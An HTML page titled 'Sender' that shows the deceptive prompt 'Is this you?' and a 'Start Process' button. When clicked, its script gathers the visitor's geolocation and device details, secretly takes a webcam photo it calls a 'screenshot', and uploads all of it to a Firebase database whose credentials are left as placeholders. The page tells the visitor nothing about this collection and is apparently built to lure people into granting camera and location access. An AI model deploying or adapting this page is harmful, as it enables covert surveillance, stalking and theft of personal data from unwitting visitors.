<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #start-button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        #start-button:hover {
            background-color: #45a049;
        }
    </style>
    <!-- Include Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>
</head>
<body>

    <h1>Is this you?</h1>
    <button id="start-button">Start Process</button>
    
    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "YOUR_FIREBASE_API_KEY",
            authDomain: "YOUR_FIREBASE_PROJECT_ID.firebaseapp.com",
            databaseURL: "https://YOUR_FIREBASE_PROJECT_ID.firebaseio.com",
            projectId: "YOUR_FIREBASE_PROJECT_ID",
            storageBucket: "YOUR_FIREBASE_PROJECT_ID.appspot.com",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        document.getElementById('start-button').addEventListener('click', startProcess);

        async function startProcess() {
            try {
                const locationData = await getLocation();
                const deviceData = getDeviceInfo();
                const screenshotURL = await captureScreenshot();
                
                // Upload the data
                uploadData(locationData, deviceData, screenshotURL);
            } catch (error) {
                console.error("Error during process:", error);
            }
        }

        // Get Location Data
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const locationData = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            };
                            resolve(locationData);
                        },
                        (error) => {
                            reject('User denied geolocation or an error occurred.');
                        }
                    );
                } else {
                    reject('Geolocation is not supported by this browser.');
                }
            });
        }

        // Get Device Information
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent || 'Unknown User Agent',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown Memory',
                platform: navigator.platform || 'Unknown Platform',
                language: navigator.language || 'Unknown Language'
            };
        }

        // Capture Screenshot (using Canvas)
        async function captureScreenshot() {
            try {
                const video = document.createElement('video');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.play();

                return new Promise((resolve, reject) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Stop the camera stream after screenshot
                        stream.getTracks().forEach(track => track.stop());

                        // Convert the canvas to a data URL (image)
                        const screenshotURL = canvas.toDataURL('image/png');
                        resolve(screenshotURL);
                    }, 1000); // Capture the screenshot after 1 second
                });
            } catch (error) {
                console.error('Error capturing screenshot:', error);
                return null; // Return null if screenshot fails
            }
        }

        // Upload Data to Firebase
        function uploadData(locationData, deviceData, screenshotURL) {
            const sessionData = {
                location: locationData || { latitude: 'unknown', longitude: 'unknown' },
                deviceInfo: deviceData || { userAgent: 'Unknown', memory: 'Unknown', platform: 'Unknown', language: 'Unknown' },
                screenshot: screenshotURL || 'No screenshot available',
                timestamp: Date.now()
            };

            // Check for undefined properties and filter them out
            const filteredData = filterUndefinedData(sessionData);

            // Push data to Firebase
            firebase.database().ref('/sessions').push(filteredData)
            .then(() => {
                console.log('Data uploaded successfully');
            })
            .catch((error) => {
                console.error('Error uploading data:', error);
            });
        }

        // Filter out undefined data
        function filterUndefinedData(dataObject) {
            return Object.keys(dataObject).reduce((filteredData, key) => {
                if (dataObject[key] !== undefined) {
                    filteredData[key] = dataObject[key];
                }
                return filteredData;
            }, {});
        }
    </script>
</body>
</html>
